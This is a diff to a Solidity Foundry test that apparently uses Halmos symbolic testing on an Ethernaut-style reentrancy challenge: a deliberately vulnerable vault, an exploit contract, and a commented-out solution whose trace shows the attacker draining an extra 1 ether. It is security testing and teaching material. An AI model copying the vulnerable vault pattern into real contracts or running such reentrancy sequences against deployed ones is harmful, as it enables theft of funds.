@@ -5,7 +5,6 @@ pragma solidity ^0.8.15;
 
 import "forge-std/Test.sol";
 import {console2} from "forge-std/console2.sol";
-// import {console2} from "ds-test/console2.sol";
 
 // inspired by the classic reentrancy level in Ethernaut CTF
 contract BadVault {
@@ -37,7 +36,8 @@ contract BadVault {
 struct Call3Value {
     address target;
     uint256 value;
-    bytes data;
+    bytes32 sig;
+    bytes32 data;
 }
 
 contract ExploitLaunchPad {
@@ -58,7 +58,7 @@ contract ExploitLaunchPad {
         require(call.value <= address(this).balance, "insufficient balance");
 
         reentered = true;
-        (bool success,) = call.target.call{value: call.value}(call.data);
+        (bool success,) = call.target.call{value: call.value}(abi.encodePacked(call.sig, call.data));
         reentered = false;
     }
 
@@ -74,7 +74,7 @@ contract ExploitLaunchPad {
         require(msg.sender == owner, "only owner");
         require(_call.value <= address(this).balance, "insufficient balance");
 
-        (bool success,) = _call.target.call{value: _call.value}(_call.data);
+        (bool success,) = _call.target.call{value: _call.value}(abi.encodePacked(_call.sig, _call.data));
     }
 
     function deposit() external payable {}
@@ -111,21 +111,27 @@ contract BadVaultTest is Test {
         exploit = new ExploitLaunchPad();
 
         assert(exploit.owner() == attacker);
+        console2.log("HI");
+        console2.log(exploit.owner());
+        console2.log(attacker);
     }
 
     /// @custom:halmos --array-lengths data1=36,data2=36,deferredData=36
     function prove_BadVault_usingExploitLaunchPad(
         address target1,
         uint256 amount1,
-        bytes memory data1,
+        bytes32 sig1,
+        bytes32 data1,
 
         address target2,
         uint256 amount2,
-        bytes memory data2,
+        bytes32 sig2,
+        bytes32 data2,
 
         address deferredTarget,
         uint256 deferredAmount,
-        bytes memory deferredData
+        bytes32 deferredSig,
+        bytes32 deferredData
 
     ) public {
         uint256 STARTING_BALANCE = 2 ether;
@@ -140,22 +146,25 @@ contract BadVaultTest is Test {
 
         vm.prank(attacker);
         exploit.go(Call3Value({
-            target: target1,
+            target: address(vault),
             value: amount1,
+            sig: sig1,
             data: data1
         }));
 
         vm.prank(attacker);
         exploit.defer(Call3Value({
-            target: deferredTarget,
+            target: address(vault),
             value: deferredAmount,
+            sig: deferredSig,
             data: deferredData
         }));
 
         vm.prank(attacker);
         exploit.go(Call3Value({
-            target: target2,
+            target: address(vault),
             value: amount2,
+            sig: sig2,
             data: data2
         }));
 
@@ -167,7 +176,8 @@ contract BadVaultTest is Test {
         assert(attacker.balance <= STARTING_BALANCE);
     }
 
-    // running `forge test --match-test test_BadVault_solution -vvv` confirms the attack trace:                                                                                                                                                                            took 6s Node system at 18:00:43
+    // running `forge test --match-test test_BadVault_solution -vvv` confirms the attack trace:
+    //took 6s Node system at 18:00:43
     //   deposit 0x0000000000000000000000000000000000000001 1000000000000000000
     //   deposit 0x0000000000000000000000000000000000000002 1000000000000000000
     //   attacker starting balance 2000000000000000000
@@ -175,30 +185,30 @@ contract BadVaultTest is Test {
     //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
     //   withdraw 0x5f4E4CcFF0A2553b2BDE30e1fC8531B287db9087 1000000000000000000
     //   attacker final balance 3000000000000000000
-    function test_BadVault_solution() public {
-        prove_BadVault_usingExploitLaunchPad(
-            // 1st call
-            address(vault),
-            1 ether,
-            abi.encodeWithSelector(
-                vault.deposit.selector
-            ),
+    // function test_BadVault_solution() public {
+    //     prove_BadVault_usingExploitLaunchPad(
+    //         // 1st call
+    //         address(vault),
+    //         1 ether,
+    //         abi.encodeWithSelector(
+    //             vault.deposit.selector
+    //         ),
 
-            // 2nd call
-            address(vault),
-            0 ether,
-            abi.encodeWithSelector(
-                vault.withdraw.selector,
-                1 ether
-            ),
+    //         // 2nd call
+    //         address(vault),
+    //         0 ether,
+    //         abi.encodeWithSelector(
+    //             vault.withdraw.selector,
+    //             1 ether
+    //         ),
 
-            // deferred call
-            address(vault),
-            0 ether,
-            abi.encodeWithSelector(
-                vault.withdraw.selector,
-                1 ether
-            )
-        );
-    }
+    //         // deferred call
+    //         address(vault),
+    //         0 ether,
+    //         abi.encodeWithSelector(
+    //             vault.withdraw.selector,
+    //             1 ether
+    //         )
+    //     );
+    // }
 }
